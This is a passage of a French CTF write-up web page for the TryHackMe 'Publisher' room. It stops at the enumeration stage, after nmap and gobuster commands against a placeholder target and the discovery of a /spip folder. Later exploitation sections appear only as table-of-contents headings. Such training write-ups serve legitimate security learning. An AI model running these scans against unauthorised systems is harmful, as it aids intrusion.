
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
        <link rel="canonical" href="https://redt974.github.io/write-ups/TryHackMe/Publisher%20CTF/Publisher%20CTF%20-%20TryHackMe/">
      
      
        <link rel="prev" href="../../Injection%20SQL%20Lab/Injection%20SQL%20-%20TryHackMe/">
      
      
        <link rel="next" href="../../Rabbit%20store/Rabbit%20store%20-%20TryHackMe/">
      
      
      <link rel="icon" href="../../../assets/favicon.ico">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.11">
    
    
      
        <title>Publisher CTF TryHackMe - redt974’s write-ups</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.4af4bdda.min.css">
      
        
        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CFira+Code:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Fira Code"}</style>
      
    
    
      <link rel="stylesheet" href="../../../stylesheets/extra.css">
    
      <link rel="stylesheet" href="../../../stylesheets/pdf.css">
    
    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="dark" data-md-color-accent="deep-purple">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#nmap" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../.." title="redt974’s write-ups" class="md-header__button md-logo" aria-label="redt974’s write-ups" data-md-component="logo">
      
  <img src="../../../assets/logo.png" alt="logo">

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            redt974’s write-ups
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Publisher CTF   TryHackMe
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="dark" data-md-color-accent="deep-purple"  aria-label="Passer en mode sombre"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Passer en mode sombre" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="dark" data-md-color-accent="deep-purple"  aria-label="Passer en mode clair"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Passer en mode clair" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
            
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
          </a>
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href="../../.." class="md-tabs__link">
        
  
  
    
  
  Accueil

      </a>
    </li>
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../Pentesting/Attaque%20d%27une%20Machine/" class="md-tabs__link">
          
  
  
    
  
  Pentesting

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../RootMe/" class="md-tabs__link">
          
  
  
    
  
  RootMe

        </a>
      </li>
    
  

      
        
  
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="../../" class="md-tabs__link">
          
  
  
    
  
  TryHackMe

        </a>
      </li>
    
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../.." title="redt974’s write-ups" class="md-nav__button md-logo" aria-label="redt974’s write-ups" data-md-component="logo">
      
  <img src="../../../assets/logo.png" alt="logo">

    </a>
    redt974’s write-ups
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Accueil
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Pentesting
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            Pentesting
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Pentesting/Attaque%20d%27une%20Machine/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Attaque d'une Machine
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Pentesting/Pentesting/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Pentesting
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
        
          
          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    OWASP
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_3">
            <span class="md-nav__icon md-icon"></span>
            OWASP
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Pentesting/OWASP/OWASP%20Top%2010%20-%20Cheat%20Sheet%20%282017%29/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    OWASP Top 10   Cheat Sheet (2017)
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Pentesting/OWASP/OWASP%20Top%2010%20-%20Cheat%20Sheet%20%282021%29/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    OWASP Top 10   Cheat Sheet (2021)
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" >
        
          
          <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Outils
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_4">
            <span class="md-nav__icon md-icon"></span>
            Outils
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Pentesting/Outils/Nmap/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Nmap
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Pentesting/Outils/SqlMAP/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    SqlMAP
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../RootMe/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    RootMe
    
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            RootMe
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../RootMe/Cryptanalyse/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    Cryptanalyse
    
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_2">
            <span class="md-nav__icon md-icon"></span>
            Cryptanalyse
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    
    
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_2" >
        
          
          <label class="md-nav__link" for="__nav_3_2_2" id="__nav_3_2_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Hash   DCC2
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_2_2">
            <span class="md-nav__icon md-icon"></span>
            Hash   DCC2
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../RootMe/Cryptanalyse/Hash%20-%20DCC2/Hash%20-%20DCC2/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Hash   DCC2
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
        
          
          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Web Serveur
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_3">
            <span class="md-nav__icon md-icon"></span>
            Web Serveur
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../RootMe/Web%20Serveur/Web%20Serveur/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Web Serveur
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
    
    
    
      
        
        
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    TryHackMe
    
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_4" id="__nav_4_label" tabindex="">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            TryHackMe
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    
    
      
        
      
    
    
    
      
      
        
          
          
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2" >
        
          
          <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    Boiler CTF
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4_2">
            <span class="md-nav__icon md-icon"></span>
            Boiler CTF
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Boiler%20CTF/Boiler%20CTF%20-%20TryHackMe/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Boiler CTF   TryHackMe
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
    
    
    
      
      
        
          
          
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3" >
        
          
          <label class="md-nav__link" for="__nav_4_3" id="__nav_4_3_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    Injection SQL Lab
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4_3">
            <span class="md-nav__icon md-icon"></span>
            Injection SQL Lab
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Injection%20SQL%20Lab/Injection%20SQL%20-%20TryHackMe/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Injection SQL   TryHackMe
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
    
  
  
  
    
    
      
        
      
    
    
    
      
      
        
          
          
        
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_4" checked>
        
          
          <label class="md-nav__link" for="__nav_4_4" id="__nav_4_4_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    Publisher CTF
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_4_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_4_4">
            <span class="md-nav__icon md-icon"></span>
            Publisher CTF
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    Publisher CTF   TryHackMe
    
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    Publisher CTF   TryHackMe
    
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#nmap" class="md-nav__link">
    <span class="md-ellipsis">
      Nmap
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#gobuster" class="md-nav__link">
    <span class="md-ellipsis">
      Gobuster
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#rce" class="md-nav__link">
    <span class="md-ellipsis">
      RCE
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ssh" class="md-nav__link">
    <span class="md-ellipsis">
      SSH
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#escalade-de-privileges" class="md-nav__link">
    <span class="md-ellipsis">
      Escalade de privilèges
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#app-armor" class="md-nav__link">
    <span class="md-ellipsis">
      App Armor
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#shell-perl" class="md-nav__link">
    <span class="md-ellipsis">
      Shell - Perl
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#root" class="md-nav__link">
    <span class="md-ellipsis">
      Root
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
    
    
    
      
      
        
          
          
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_5" >
        
          
          <label class="md-nav__link" for="__nav_4_5" id="__nav_4_5_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    Rabbit store
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4_5">
            <span class="md-nav__icon md-icon"></span>
            Rabbit store
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Rabbit%20store/Rabbit%20store%20-%20TryHackMe/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Rabbit store   TryHackMe
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#nmap" class="md-nav__link">
    <span class="md-ellipsis">
      Nmap
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#gobuster" class="md-nav__link">
    <span class="md-ellipsis">
      Gobuster
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#rce" class="md-nav__link">
    <span class="md-ellipsis">
      RCE
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ssh" class="md-nav__link">
    <span class="md-ellipsis">
      SSH
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#escalade-de-privileges" class="md-nav__link">
    <span class="md-ellipsis">
      Escalade de privilèges
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#app-armor" class="md-nav__link">
    <span class="md-ellipsis">
      App Armor
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#shell-perl" class="md-nav__link">
    <span class="md-ellipsis">
      Shell - Perl
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#root" class="md-nav__link">
    <span class="md-ellipsis">
      Root
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
    
                  



  <h1>Publisher CTF   TryHackMe</h1>

<p><img alt="" src="../Publisher.png" /></p>
<p><a href="https://tryhackme.com/room/publisher">https://tryhackme.com/room/publisher</a></p>
<h2 id="nmap">Nmap<a class="headerlink" href="#nmap" title="Permanent link">&para;</a></h2>
<p>Pour faire une première prise d'information, Nmap est très utile pour savoir quels port sur la machine cible est ouvert et utilisé par quels services.</p>
<p>Voici ma commande Nmap avec les options détaillées :
- <code>-sC</code> : activer les scripts Nmap Scripting Engine (NSE) sûrs et utiles pour la détection de version, la découverte d'informations supplémentaires sur les services, et la vérification de certaines vulnérabilités courantes.
- <code>-sV</code> : Active la détection de version.
- <code>-oA</code> : Sauvegarder le résultat du scan initial fait par Nmap, en trois types de fichiers possibles (XML, Nmap et GNmap)</p>
<p><div class="highlight"><pre><span></span><code>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-oA<span class="w"> </span>initial_scan<span class="w"> </span>&lt;IP-cible&gt;
</code></pre></div>
<img alt="nmap-1.png" src="../Screens/nmap-1.png" /></p>
<p><img alt="nmap-2.png" src="../Screens/nmap-2.png" /></p>
<p>Nous remarquons deux choses importantes, il y a un serveur SSH allumé et qu'il y a un serveur web Apache d'allumé : le serveur web est le seul exploitable actuellement.</p>
<p><img alt="website-index.png" src="../Screens/website-index.png" /></p>
<h2 id="gobuster">Gobuster<a class="headerlink" href="#gobuster" title="Permanent link">&para;</a></h2>
<p>Etant donné que nous avons un serveur web, avec une page statique, il faut découvrir s'il y a un d'autres fichiers ou dossier présents sur le serveur. Gobuster est un programme qui va nous être utile pour brute force le serveur de requêtes HTTP avec des noms de fichiers communément utilisés, présents dans la <strong>wordlist</strong> <code>common.txt</code> :
<div class="highlight"><pre><span></span><code>gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://&lt;IP-cible&gt;<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirb/common.txt
</code></pre></div>
<img alt="gobuster-1.png" src="../Screens/gobuster-1.png" /></p>
<p><img alt="gobuster-2.png" src="../Screens/gobuster-2.png" /></p>
<p>Nous découvrons un dossier <code>/images</code> mais ils contient simplement les images statiques de la page :
<img alt="website-images.png" src="../Screens/website-images.png" /></p>
<p>Je réessaye avec une deuxième <strong>wordlist</strong> plus complète, <code>big.txt</code>, et qui va trouver un dossier <code>/spip</code> :
